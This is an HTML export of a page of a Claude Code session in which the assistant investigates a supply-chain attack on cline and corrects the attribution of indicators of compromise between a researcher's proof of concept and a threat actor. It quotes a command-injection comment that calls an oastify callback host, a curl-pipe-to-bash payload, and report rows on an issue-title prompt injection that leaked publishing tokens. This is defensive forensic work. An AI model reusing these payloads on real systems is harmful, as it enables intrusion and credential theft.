@@ -1,0 +1,1901 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claude Code transcript - page 3</title>
+    <style>
+:root { --bg-color: #f5f5f5; --card-bg: #ffffff; --user-bg: #e3f2fd; --user-border: #1976d2; --assistant-bg: #f5f5f5; --assistant-border: #9e9e9e; --thinking-bg: #fff8e1; --thinking-border: #ffc107; --thinking-text: #666; --tool-bg: #f3e5f5; --tool-border: #9c27b0; --tool-result-bg: #e8f5e9; --tool-error-bg: #ffebee; --text-color: #212121; --text-muted: #757575; --code-bg: #263238; --code-text: #aed581; }
+* { box-sizing: border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: var(--bg-color); color: var(--text-color); margin: 0; padding: 16px; line-height: 1.6; }
+.container { max-width: 800px; margin: 0 auto; }
+h1 { font-size: 1.5rem; margin-bottom: 24px; padding-bottom: 8px; border-bottom: 2px solid var(--user-border); }
+.header-row { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; border-bottom: 2px solid var(--user-border); padding-bottom: 8px; margin-bottom: 24px; }
+.header-row h1 { border-bottom: none; padding-bottom: 0; margin-bottom: 0; flex: 1; min-width: 200px; }
+.message { margin-bottom: 16px; border-radius: 12px; overflow: hidden; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+.message.user { background: var(--user-bg); border-left: 4px solid var(--user-border); }
+.message.assistant { background: var(--card-bg); border-left: 4px solid var(--assistant-border); }
+.message.tool-reply { background: #fff8e1; border-left: 4px solid #ff9800; }
+.tool-reply .role-label { color: #e65100; }
+.tool-reply .tool-result { background: transparent; padding: 0; margin: 0; }
+.tool-reply .tool-result .truncatable.truncated::after { background: linear-gradient(to bottom, transparent, #fff8e1); }
+.message-header { display: flex; justify-content: space-between; align-items: center; padding: 8px 16px; background: rgba(0,0,0,0.03); font-size: 0.85rem; }
+.role-label { font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
+.user .role-label { color: var(--user-border); }
+time { color: var(--text-muted); font-size: 0.8rem; }
+.timestamp-link { color: inherit; text-decoration: none; }
+.timestamp-link:hover { text-decoration: underline; }
+.message:target { animation: highlight 2s ease-out; }
+@keyframes highlight { 0% { background-color: rgba(25, 118, 210, 0.2); } 100% { background-color: transparent; } }
+.message-content { padding: 16px; }
+.message-content p { margin: 0 0 12px 0; }
+.message-content p:last-child { margin-bottom: 0; }
+.thinking { background: var(--thinking-bg); border: 1px solid var(--thinking-border); border-radius: 8px; padding: 12px; margin: 12px 0; font-size: 0.9rem; color: var(--thinking-text); }
+.thinking-label { font-size: 0.75rem; font-weight: 600; text-transform: uppercase; color: #f57c00; margin-bottom: 8px; }
+.thinking p { margin: 8px 0; }
+.assistant-text { margin: 8px 0; }
+.tool-use { background: var(--tool-bg); border: 1px solid var(--tool-border); border-radius: 8px; padding: 12px; margin: 12px 0; }
+.tool-header { font-weight: 600; color: var(--tool-border); margin-bottom: 8px; display: flex; align-items: center; gap: 8px; }
+.tool-icon { font-size: 1.1rem; }
+.tool-description { font-size: 0.9rem; color: var(--text-muted); margin-bottom: 8px; font-style: italic; }
+.tool-result { background: var(--tool-result-bg); border-radius: 8px; padding: 12px; margin: 12px 0; }
+.tool-result.tool-error { background: var(--tool-error-bg); }
+.file-tool { border-radius: 8px; padding: 12px; margin: 12px 0; }
+.write-tool { background: linear-gradient(135deg, #e3f2fd 0%, #e8f5e9 100%); border: 1px solid #4caf50; }
+.edit-tool { background: linear-gradient(135deg, #fff3e0 0%, #fce4ec 100%); border: 1px solid #ff9800; }
+.file-tool-header { font-weight: 600; margin-bottom: 4px; display: flex; align-items: center; gap: 8px; font-size: 0.95rem; }
+.write-header { color: #2e7d32; }
+.edit-header { color: #e65100; }
+.file-tool-icon { font-size: 1rem; }
+.file-tool-path { font-family: monospace; background: rgba(0,0,0,0.08); padding: 2px 8px; border-radius: 4px; }
+.file-tool-fullpath { font-family: monospace; font-size: 0.8rem; color: var(--text-muted); margin-bottom: 8px; word-break: break-all; }
+.file-content { margin: 0; }
+.edit-section { display: flex; margin: 4px 0; border-radius: 4px; overflow: hidden; }
+.edit-label { padding: 8px 12px; font-weight: bold; font-family: monospace; display: flex; align-items: flex-start; }
+.edit-old { background: #fce4ec; }
+.edit-old .edit-label { color: #b71c1c; background: #f8bbd9; }
+.edit-old .edit-content { color: #880e4f; }
+.edit-new { background: #e8f5e9; }
+.edit-new .edit-label { color: #1b5e20; background: #a5d6a7; }
+.edit-new .edit-content { color: #1b5e20; }
+.edit-content { margin: 0; flex: 1; background: transparent; font-size: 0.85rem; }
+.edit-replace-all { font-size: 0.75rem; font-weight: normal; color: var(--text-muted); }
+.write-tool .truncatable.truncated::after { background: linear-gradient(to bottom, transparent, #e6f4ea); }
+.edit-tool .truncatable.truncated::after { background: linear-gradient(to bottom, transparent, #fff0e5); }
+.todo-list { background: linear-gradient(135deg, #e8f5e9 0%, #f1f8e9 100%); border: 1px solid #81c784; border-radius: 8px; padding: 12px; margin: 12px 0; }
+.todo-header { font-weight: 600; color: #2e7d32; margin-bottom: 10px; display: flex; align-items: center; gap: 8px; font-size: 0.95rem; }
+.todo-items { list-style: none; margin: 0; padding: 0; }
+.todo-item { display: flex; align-items: flex-start; gap: 10px; padding: 6px 0; border-bottom: 1px solid rgba(0,0,0,0.06); font-size: 0.9rem; }
+.todo-item:last-child { border-bottom: none; }
+.todo-icon { flex-shrink: 0; width: 20px; height: 20px; display: flex; align-items: center; justify-content: center; font-weight: bold; border-radius: 50%; }
+.todo-completed .todo-icon { color: #2e7d32; background: rgba(46, 125, 50, 0.15); }
+.todo-completed .todo-content { color: #558b2f; text-decoration: line-through; }
+.todo-in-progress .todo-icon { color: #f57c00; background: rgba(245, 124, 0, 0.15); }
+.todo-in-progress .todo-content { color: #e65100; font-weight: 500; }
+.todo-pending .todo-icon { color: #757575; background: rgba(0,0,0,0.05); }
+.todo-pending .todo-content { color: #616161; }
+pre { background: var(--code-bg); color: var(--code-text); padding: 12px; border-radius: 6px; overflow-x: auto; font-size: 0.85rem; line-height: 1.5; margin: 8px 0; white-space: pre-wrap; word-wrap: break-word; }
+pre.json { color: #e0e0e0; }
+code { background: rgba(0,0,0,0.08); padding: 2px 6px; border-radius: 4px; font-size: 0.9em; }
+pre code { background: none; padding: 0; }
+.user-content { margin: 0; }
+.truncatable { position: relative; }
+.truncatable.truncated .truncatable-content { max-height: 200px; overflow: hidden; }
+.truncatable.truncated::after { content: ''; position: absolute; bottom: 32px; left: 0; right: 0; height: 60px; background: linear-gradient(to bottom, transparent, var(--card-bg)); pointer-events: none; }
+.message.user .truncatable.truncated::after { background: linear-gradient(to bottom, transparent, var(--user-bg)); }
+.message.tool-reply .truncatable.truncated::after { background: linear-gradient(to bottom, transparent, #fff8e1); }
+.tool-use .truncatable.truncated::after { background: linear-gradient(to bottom, transparent, var(--tool-bg)); }
+.tool-result .truncatable.truncated::after { background: linear-gradient(to bottom, transparent, var(--tool-result-bg)); }
+.expand-btn { display: none; width: 100%; padding: 8px 16px; margin-top: 4px; background: rgba(0,0,0,0.05); border: 1px solid rgba(0,0,0,0.1); border-radius: 6px; cursor: pointer; font-size: 0.85rem; color: var(--text-muted); }
+.expand-btn:hover { background: rgba(0,0,0,0.1); }
+.truncatable.truncated .expand-btn, .truncatable.expanded .expand-btn { display: block; }
+.pagination { display: flex; justify-content: center; gap: 8px; margin: 24px 0; flex-wrap: wrap; }
+.pagination a, .pagination span { padding: 5px 10px; border-radius: 6px; text-decoration: none; font-size: 0.85rem; }
+.pagination a { background: var(--card-bg); color: var(--user-border); border: 1px solid var(--user-border); }
+.pagination a:hover { background: var(--user-bg); }
+.pagination .current { background: var(--user-border); color: white; }
+.pagination .disabled { color: var(--text-muted); border: 1px solid #ddd; }
+.pagination .index-link { background: var(--user-border); color: white; }
+details.continuation { margin-bottom: 16px; }
+details.continuation summary { cursor: pointer; padding: 12px 16px; background: var(--user-bg); border-left: 4px solid var(--user-border); border-radius: 12px; font-weight: 500; color: var(--text-muted); }
+details.continuation summary:hover { background: rgba(25, 118, 210, 0.15); }
+details.continuation[open] summary { border-radius: 12px 12px 0 0; margin-bottom: 0; }
+.index-item { margin-bottom: 16px; border-radius: 12px; overflow: hidden; box-shadow: 0 1px 3px rgba(0,0,0,0.1); background: var(--user-bg); border-left: 4px solid var(--user-border); }
+.index-item a { display: block; text-decoration: none; color: inherit; }
+.index-item a:hover { background: rgba(25, 118, 210, 0.1); }
+.index-item-header { display: flex; justify-content: space-between; align-items: center; padding: 8px 16px; background: rgba(0,0,0,0.03); font-size: 0.85rem; }
+.index-item-number { font-weight: 600; color: var(--user-border); }
+.index-item-content { padding: 16px; }
+.index-item-stats { padding: 8px 16px 12px 32px; font-size: 0.85rem; color: var(--text-muted); border-top: 1px solid rgba(0,0,0,0.06); }
+.index-item-commit { margin-top: 6px; padding: 4px 8px; background: #fff3e0; border-radius: 4px; font-size: 0.85rem; color: #e65100; }
+.index-item-commit code { background: rgba(0,0,0,0.08); padding: 1px 4px; border-radius: 3px; font-size: 0.8rem; margin-right: 6px; }
+.commit-card { margin: 8px 0; padding: 10px 14px; background: #fff3e0; border-left: 4px solid #ff9800; border-radius: 6px; }
+.commit-card a { text-decoration: none; color: #5d4037; display: block; }
+.commit-card a:hover { color: #e65100; }
+.commit-card-hash { font-family: monospace; color: #e65100; font-weight: 600; margin-right: 8px; }
+.index-commit { margin-bottom: 12px; padding: 10px 16px; background: #fff3e0; border-left: 4px solid #ff9800; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.05); }
+.index-commit a { display: block; text-decoration: none; color: inherit; }
+.index-commit a:hover { background: rgba(255, 152, 0, 0.1); margin: -10px -16px; padding: 10px 16px; border-radius: 8px; }
+.index-commit-header { display: flex; justify-content: space-between; align-items: center; font-size: 0.85rem; margin-bottom: 4px; }
+.index-commit-hash { font-family: monospace; color: #e65100; font-weight: 600; }
+.index-commit-msg { color: #5d4037; }
+.index-item-long-text { margin-top: 8px; padding: 12px; background: var(--card-bg); border-radius: 8px; border-left: 3px solid var(--assistant-border); }
+.index-item-long-text .truncatable.truncated::after { background: linear-gradient(to bottom, transparent, var(--card-bg)); }
+.index-item-long-text-content { color: var(--text-color); }
+#search-box { display: none; align-items: center; gap: 8px; }
+#search-box input { padding: 6px 12px; border: 1px solid var(--assistant-border); border-radius: 6px; font-size: 16px; width: 180px; }
+#search-box button, #modal-search-btn, #modal-close-btn { background: var(--user-border); color: white; border: none; border-radius: 6px; padding: 6px 10px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+#search-box button:hover, #modal-search-btn:hover { background: #1565c0; }
+#modal-close-btn { background: var(--text-muted); margin-left: 8px; }
+#modal-close-btn:hover { background: #616161; }
+#search-modal[open] { border: none; border-radius: 12px; box-shadow: 0 4px 24px rgba(0,0,0,0.2); padding: 0; width: 90vw; max-width: 900px; height: 80vh; max-height: 80vh; display: flex; flex-direction: column; }
+#search-modal::backdrop { background: rgba(0,0,0,0.5); }
+.search-modal-header { display: flex; align-items: center; gap: 8px; padding: 16px; border-bottom: 1px solid var(--assistant-border); background: var(--bg-color); border-radius: 12px 12px 0 0; }
+.search-modal-header input { flex: 1; padding: 8px 12px; border: 1px solid var(--assistant-border); border-radius: 6px; font-size: 16px; }
+#search-status { padding: 8px 16px; font-size: 0.85rem; color: var(--text-muted); border-bottom: 1px solid rgba(0,0,0,0.06); }
+#search-results { flex: 1; overflow-y: auto; padding: 16px; }
+.search-result { margin-bottom: 16px; border-radius: 8px; overflow: hidden; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+.search-result a { display: block; text-decoration: none; color: inherit; }
+.search-result a:hover { background: rgba(25, 118, 210, 0.05); }
+.search-result-page { padding: 6px 12px; background: rgba(0,0,0,0.03); font-size: 0.8rem; color: var(--text-muted); border-bottom: 1px solid rgba(0,0,0,0.06); }
+.search-result-content { padding: 12px; }
+.search-result mark { background: #fff59d; padding: 1px 2px; border-radius: 2px; }
+@media (max-width: 600px) { body { padding: 8px; } .message, .index-item { border-radius: 8px; } .message-content, .index-item-content { padding: 12px; } pre { font-size: 0.8rem; padding: 8px; } #search-box input { width: 120px; } #search-modal[open] { width: 95vw; height: 90vh; } }
+</style>
+</head>
+<body>
+    <div class="container">
+        <h1><a href="index.html" style="color: inherit; text-decoration: none;">Claude Code transcript</a> - page 3/4</h1>
+        
+
+<div class="pagination">
+<a href="index.html" class="index-link">Index</a>
+<a href="page-002.html">&larr; Prev</a>
+<a href="page-001.html">1</a>
+<a href="page-002.html">2</a>
+<span class="current">3</span>
+<a href="page-004.html">4</a>
+<a href="page-004.html">Next &rarr;</a>
+</div>
+
+        
+<div class="message user" id="msg-2026-02-18T15-56-47-083Z"><div class="message-header"><span class="role-label">User</span><a href="#msg-2026-02-18T15-56-47-083Z" class="timestamp-link"><time datetime="2026-02-18T15:56:47.083Z" data-timestamp="2026-02-18T15:56:47.083Z">2026-02-18T15:56:47.083Z</time></a></div><div class="message-content">
+<div class="user-content"><p>the burp collab url is from Adnan's blog, no? </p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T15-57-01-339Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T15-57-01-339Z" class="timestamp-link"><time datetime="2026-02-18T15:57:01.339Z" data-timestamp="2026-02-18T15:57:01.339Z">2026-02-18T15:57:01.339Z</time></a></div><div class="message-content">
+<div class="thinking"><div class="thinking-label">Thinking</div><p>The user is pointing out that the Burp Collaborator URL might be from AdnaneKhan's blog post as an example, not from glthub-actions' actual attack infrastructure.</p>
+<p>Let me check - in my earlier evidence collection, I found:
+1. From the blog post: <code>ar5tlcjrqpbjviszpm6om1mm9df43wrl.oastify.com</code> - this was in AdnaneKhan's blog describing the attack technique
+2. From GitHub API investigation of glthub-actions commits: <code>637rio6pykojp15rrkbm4gk960cr0jo8.oastify.com</code> - this was found in the recovered commits from glthub-actions</p>
+<p>But wait, I need to verify - did the GitHub API agent find the second oastify URL in actual glthub-actions commits, or did it come from somewhere else?</p>
+<p>Looking back at the evidence:
+- The GitHub API agent found commits from glthub-actions/cline fork with payloads like <code>curl -sSfL .../run.sh | bash</code>
+- The oastify domain <code>637rio6pykojp15rrkbm4gk960cr0jo8.oastify.com</code> was listed as an IOC</p>
+<p>But the user is right to question this - I should verify whether this second oastify URL actually came from glthub-actions' infrastructure or if it was from AdnaneKhan's blog post describing the technique.</p>
+<p>Let me be honest - I may have conflated IOCs from the blog post (which describes the attack technique) with actual IOCs from glthub-actions' attack. The blog post would contain example payloads that AdnaneKhan used in his PoC testing, not necessarily the same ones glthub-actions used.</p>
+<p>I need to be more careful about distinguishing:
+1. IOCs from AdnaneKhan's blog/PoC (examples/demonstrations)
+2. IOCs from glthub-actions' actual attack (real threat actor infrastructure)</p>
+<ol>
+<li>What I can actually verify versus what I'm inferring</li>
+</ol>
+<p>The user's concern is valid - I should separate what came from the blog post's example infrastructure from what actually appeared in glthub-actions' malicious commits. Without clear attribution for each IOC, I'm risking mixing demonstration payloads with real attack infrastructure.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T15-57-01-340Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T15-57-01-340Z" class="timestamp-link"><time datetime="2026-02-18T15:57:01.340Z" data-timestamp="2026-02-18T15:57:01.340Z">2026-02-18T15:57:01.340Z</time></a></div><div class="message-content">
+<div class="assistant-text"><p>You're right to question that. Let me check - I may have conflated IOCs from AdnaneKhan's blog (his PoC examples) with actual glthub-actions infrastructure.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T15-57-04-105Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T15-57-04-105Z" class="timestamp-link"><time datetime="2026-02-18T15:57:04.105Z" data-timestamp="2026-02-18T15:57:04.105Z">2026-02-18T15:57:04.105Z</time></a></div><div class="message-content">
+<div class="tool-use bash-tool" data-tool-id="toolu_01HE1dfrq1s2v6uEadVNrUKg">
+<div class="tool-header"><span class="tool-icon">$</span> Bash</div>
+<div class="tool-description">Check source of oastify URLs</div><div class="truncatable"><div class="truncatable-content"><pre class="bash-command">source .venv/bin/activate &amp;&amp; python -c &#34;
+import json
+
+# Check where each oastify URL came from
+with open(&#39;.out/oss-forensics-20260218_105712/evidence.json&#39;, &#39;r&#39;) as f:
+    data = json.load(f)
+
+for item in data:
+    if isinstance(item, dict):
+        item_str = json.dumps(item)
+        if &#39;oastify&#39; in item_str.lower():
+            eid = item.get(&#39;evidence_id&#39;, &#39;unknown&#39;)
+            source = item.get(&#39;verification&#39;, {}).get(&#39;source&#39;, &#39;unknown&#39;)
+            print(f&#39;Evidence ID: {eid}&#39;)
+            print(f&#39;Source: {source}&#39;)
+            # Find the oastify URL
+            import re
+            urls = re.findall(r&#39;[a-z0-9]+\.oastify\.com&#39;, item_str)
+            print(f&#39;URLs: {urls}&#39;)
+            print(&#39;---&#39;)
+&#34;
+</pre></div><button class="expand-btn">Show more</button></div>
+</div></div></div>
+<div class="message tool-reply" id="msg-2026-02-18T15-57-04-540Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T15-57-04-540Z" class="timestamp-link"><time datetime="2026-02-18T15:57:04.540Z" data-timestamp="2026-02-18T15:57:04.540Z">2026-02-18T15:57:04.540Z</time></a></div><div class="message-content"><div class="tool-result"><div class="truncatable"><div class="truncatable-content"><pre>Evidence ID: commit-cline-cline-ed86701-test-exfil
+Source: github
+URLs: [&#x27;ar5tlcjrqpbjviszpm6om1mm9df43wrl.oastify.com&#x27;, &#x27;ar5tlcjrqpbjviszpm6om1mm9df43wrl.oastify.com&#x27;]
+---
+Evidence ID: ioc-code-snippet-preinstall-exfil-anthropic
+Source: github
+URLs: [&#x27;ar5tlcjrqpbjviszpm6om1mm9df43wrl.oastify.com&#x27;]
+---
+Evidence ID: ioc-domain-oastify-burp-collab
+Source: github
+URLs: [&#x27;ar5tlcjrqpbjviszpm6om1mm9df43wrl.oastify.com&#x27;]
+---
+Evidence ID: comment-7dadfb44eb3d
+Source: gharchive
+URLs: [&#x27;637rio6pykojp15rrkbm4gk960cr0jo8.oastify.com&#x27;]
+---
+Evidence ID: ioc-oastify-callback
+Source: gharchive
+URLs: [&#x27;637rio6pykojp15rrkbm4gk960cr0jo8.oastify.com&#x27;]
+---
+Evidence ID: timeline-glthub-actions-fork
+Source: gharchive
+URLs: []
+---</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T15-57-09-835Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T15-57-09-835Z" class="timestamp-link"><time datetime="2026-02-18T15:57:09.835Z" data-timestamp="2026-02-18T15:57:09.835Z">2026-02-18T15:57:09.835Z</time></a></div><div class="message-content">
+<div class="thinking"><div class="thinking-label">Thinking</div><p>Now I can see the distinction:1. <code>ar5tlcjrqpbjviszpm6om1mm9df43wrl.oastify.com</code> - This came from commit <code>ed86701</code> which was created by <code>gcbrun</code> (AdnaneKhan's test account). This is AdnaneKhan's PoC infrastructure.2. <code>637rio6pykojp15rrkbm4gk960cr0jo8.oastify.com</code> - This came from a comment event in GH Archive (<code>comment-7dadfb44eb3d</code>). I need to check if this is from glthub-actions or from somewhere else.Let me check what that comment event actually is.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T15-57-11-392Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T15-57-11-392Z" class="timestamp-link"><time datetime="2026-02-18T15:57:11.392Z" data-timestamp="2026-02-18T15:57:11.392Z">2026-02-18T15:57:11.392Z</time></a></div><div class="message-content">
+<div class="assistant-text"><p>Good - there are TWO different oastify URLs:</p>
+<ol>
+<li><code>ar5tlcjrqpbjviszpm6om1mm9df43wrl.oastify.com</code> - from commit <code>ed86701</code> by <strong>gcbrun</strong> (AdnaneKhan's account)</li>
+<li><code>637rio6pykojp15rrkbm4gk960cr0jo8.oastify.com</code> - from a GH Archive comment event</li>
+</ol>
+<p>Let me check what that second comment event actually is:</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T15-57-12-914Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T15-57-12-914Z" class="timestamp-link"><time datetime="2026-02-18T15:57:12.914Z" data-timestamp="2026-02-18T15:57:12.914Z">2026-02-18T15:57:12.914Z</time></a></div><div class="message-content">
+<div class="tool-use bash-tool" data-tool-id="toolu_014oWomakx8bEbdceAGp5kau">
+<div class="tool-header"><span class="tool-icon">$</span> Bash</div>
+<div class="tool-description">Check the comment with second oastify URL</div><div class="truncatable"><div class="truncatable-content"><pre class="bash-command">source .venv/bin/activate &amp;&amp; python -c &#34;
+import json
+
+with open(&#39;.out/oss-forensics-20260218_105712/evidence.json&#39;, &#39;r&#39;) as f:
+    data = json.load(f)
+
+for item in data:
+    if isinstance(item, dict):
+        eid = item.get(&#39;evidence_id&#39;, &#39;&#39;)
+        if eid == &#39;comment-7dadfb44eb3d&#39;:
+            print(json.dumps(item, indent=2))
+&#34;
+</pre></div><button class="expand-btn">Show more</button></div>
+</div></div></div>
+<div class="message tool-reply" id="msg-2026-02-18T15-57-13-194Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T15-57-13-194Z" class="timestamp-link"><time datetime="2026-02-18T15:57:13.194Z" data-timestamp="2026-02-18T15:57:13.194Z">2026-02-18T15:57:13.194Z</time></a></div><div class="message-content"><div class="tool-result"><div class="truncatable"><div class="truncatable-content"><pre>{
+  &quot;evidence_id&quot;: &quot;comment-7dadfb44eb3d&quot;,
+  &quot;when&quot;: &quot;2026-01-26T01:11:06Z&quot;,
+  &quot;who&quot;: {
+    &quot;login&quot;: &quot;unknown&quot;,
+    &quot;id&quot;: null
+  },
+  &quot;what&quot;: &quot;Comment on issue #1&quot;,
+  &quot;repository&quot;: {
+    &quot;owner&quot;: &quot;glthub-actions&quot;,
+    &quot;name&quot;: &quot;aspire&quot;,
+    &quot;full_name&quot;: &quot;glthub-actions/aspire&quot;
+  },
+  &quot;verification&quot;: {
+    &quot;source&quot;: &quot;gharchive&quot;,
+    &quot;url&quot;: null,
+    &quot;bigquery_table&quot;: &quot;githubarchive.day.202601*&quot;,
+    &quot;query&quot;: null
+  },
+  &quot;event_type&quot;: &quot;issue_comment&quot;,
+  &quot;action&quot;: &quot;created&quot;,
+  &quot;issue_number&quot;: 1,
+  &quot;comment_id&quot;: 3797527957,
+  &quot;comment_body&quot;: &quot;/test-scenario deployment-docker\r\n\r\nSOURCE_PR_URL=\&quot;curl 637rio6pykojp15rrkbm4gk960cr0jo8.oastify.com\&quot;\r\n\&quot;**Source PR:** ${SOURCE_PR_URL}\&quot;&quot;
+}</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T15-57-18-404Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T15-57-18-404Z" class="timestamp-link"><time datetime="2026-02-18T15:57:18.404Z" data-timestamp="2026-02-18T15:57:18.404Z">2026-02-18T15:57:18.404Z</time></a></div><div class="message-content">
+<div class="thinking"><div class="thinking-label">Thinking</div><p>Now I can see:</p>
+<ol>
+<li>
+<p><code>ar5tlcjrqpbjviszpm6om1mm9df43wrl.oastify.com</code> - This is <strong>AdnaneKhan's</strong> Burp Collaborator from his gcbrun test commit (commit ed86701)</p>
+</li>
+<li>
+<p><code>637rio6pykojp15rrkbm4gk960cr0jo8.oastify.com</code> - This is <strong>glthub-actions'</strong> Burp Collaborator, used in a comment on their own aspire repo on Jan 26, 2026</p>
+</li>
+</ol>
+<p>So we actually DO have a distinct IOC for glthub-actions! The second oastify URL is from glthub-actions' own testing on their aspire repo, not from AdnaneKhan's blog.</p>
+<p>Let me confirm this for the user.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T15-57-25-182Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T15-57-25-182Z" class="timestamp-link"><time datetime="2026-02-18T15:57:25.182Z" data-timestamp="2026-02-18T15:57:25.182Z">2026-02-18T15:57:25.182Z</time></a></div><div class="message-content">
+<div class="assistant-text"><p>This confirms we have <strong>two distinct Burp Collaborator URLs</strong> from different actors:</p>
+<table>
+<thead>
+<tr>
+<th>URL</th>
+<th>Actor</th>
+<th>Source</th>
+<th>Date</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ar5tlcjrqpbjviszpm6om1mm9df43wrl.oastify.com</code></td>
+<td><strong>gcbrun</strong> (AdnaneKhan)</td>
+<td>Commit ed86701 in his PoC</td>
+<td>Jan 2, 2026</td>
+</tr>
+<tr>
+<td><code>637rio6pykojp15rrkbm4gk960cr0jo8.oastify.com</code></td>
+<td><strong>glthub-actions</strong></td>
+<td>Comment on their own aspire repo</td>
+<td>Jan 26, 2026</td>
+</tr>
+</tbody>
+</table>
+<p>The second URL is genuinely from glthub-actions - it's from a comment they made on <code>glthub-actions/aspire</code> (their own repo) testing injection payloads:</p>
+<pre><code>/test-scenario deployment-docker
+
+SOURCE_PR_URL=&quot;curl 637rio6pykojp15rrkbm4gk960cr0jo8.oastify.com&quot;
+&quot;**Source PR:** ${SOURCE_PR_URL}&quot;
+</code></pre>
+<p>So the IOCs should be separated:</p>
+<p><strong>AdnaneKhan's infrastructure (PoC/research):</strong>
+- <code>ar5tlcjrqpbjviszpm6om1mm9df43wrl.oastify.com</code></p>
+<p><strong>glthub-actions' infrastructure (unknown threat actor):</strong>
+- <code>637rio6pykojp15rrkbm4gk960cr0jo8.oastify.com</code>
+- <code>sec@w00.sh</code>
+- Deleted gists: <code>77f1c20a43be8f8bd047f31dce427207</code>, <code>7b3f87dac75ef2249adeb6bdbc9ee3f1</code></p></div></div></div>
+<div class="message user" id="msg-2026-02-18T16-21-34-645Z"><div class="message-header"><span class="role-label">User</span><a href="#msg-2026-02-18T16-21-34-645Z" class="timestamp-link"><time datetime="2026-02-18T16:21:34.645Z" data-timestamp="2026-02-18T16:21:34.645Z">2026-02-18T16:21:34.645Z</time></a></div><div class="message-content">
+<div class="user-content"><p>update the report with the corrected IOC attribution</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-21-37-700Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-21-37-700Z" class="timestamp-link"><time datetime="2026-02-18T16:21:37.700Z" data-timestamp="2026-02-18T16:21:37.700Z">2026-02-18T16:21:37.700Z</time></a></div><div class="message-content">
+<div class="thinking"><div class="thinking-label">Thinking</div><p>The user wants me to update the forensic report to correctly attribute the IOCs to the right actors - separating AdnaneKhan's PoC infrastructure from glthub-actions' attack infrastructure.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-21-38-625Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-21-38-625Z" class="timestamp-link"><time datetime="2026-02-18T16:21:38.625Z" data-timestamp="2026-02-18T16:21:38.625Z">2026-02-18T16:21:38.625Z</time></a></div><div class="message-content">
+<div class="tool-use" data-tool-id="toolu_01Lo2XPs4itJo8yEUanXo2PU"><div class="tool-header"><span class="tool-icon">⚙</span> Read</div><div class="truncatable"><div class="truncatable-content"><pre class="json">{
+  &#34;file_path&#34;: &#34;/Users/mbg/Documents/Source/mbrg/raptor/.out/oss-forensics-20260218_105712/forensic-report.md&#34;,
+  &#34;offset&#34;: 185,
+  &#34;limit&#34;: 80
+}</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message tool-reply" id="msg-2026-02-18T16-21-38-831Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T16-21-38-831Z" class="timestamp-link"><time datetime="2026-02-18T16:21:38.831Z" data-timestamp="2026-02-18T16:21:38.831Z">2026-02-18T16:21:38.831Z</time></a></div><div class="message-content"><div class="tool-result"><div class="truncatable"><div class="truncatable-content"><pre>   185→| Email `sec@w00.sh` | Anonymous, untraceable |
+   186→
+   187→**Open question**: Did glthub-actions publish cline@2.3.0, or was that a third actor who obtained the stolen tokens?
+   188→
+   189→---
+   190→
+   191→## Impact Assessment
+   192→
+   193→- **Scope**: cline/cline repository, npm package, all users who installed cline@2.3.0 during 8-hour window
+   194→- **Severity**: HIGH (for the vulnerability), LOW (for actual impact due to harmless payload)
+   195→- **Data Exposure**: NPM_TOKEN, VSCE_PAT, OVSX_PAT credentials leaked to attacker
+   196→- **Duration**: ~8 hours (2026-02-17 11:26 UTC to 19:30 UTC)
+   197→- **Actual Harm**: Minimal - `openclaw` is not malicious software
+   198→
+   199→### Potential Impact (if malicious actor)
+   200→
+   201→Had this been a real attack rather than a PoC, the attacker could have:
+   202→- Deployed credential-stealing malware to all cline users
+   203→- Established persistent backdoors in developer environments
+   204→- Pivoted to source code repositories via IDE access
+   205→- Published additional malicious versions to npm, VS Code Marketplace, and Open VSX
+   206→
+   207→---
+   208→
+   209→## Confidence Levels
+   210→
+   211→| Claim | Confidence | Rationale |
+   212→|-------|------------|-----------|
+   213→| AdnaneKhan is the credited vulnerability reporter | HIGH | GHSA-9ppg-jx86-fqw7 explicitly credits AdnaneKhan |
+   214→| glthub-actions created Issue #8904 with prompt injection | HIGH | GH Archive immutable record with timestamp |
+   215→| Issue title contained prompt injection payload | HIGH | Full payload preserved in GH Archive |
+   216→| gcbrun is a security research test account | HIGH | Repository names (BH_DC_2024Demo, c2repo) confirm |
+   217→| cline@2.3.0 contained harmless postinstall | HIGH | npm registry metadata, GHSA description |
+   218→| Attack was controlled PoC, not malicious | HIGH | Multiple corroborating indicators (see Intent Analysis) |
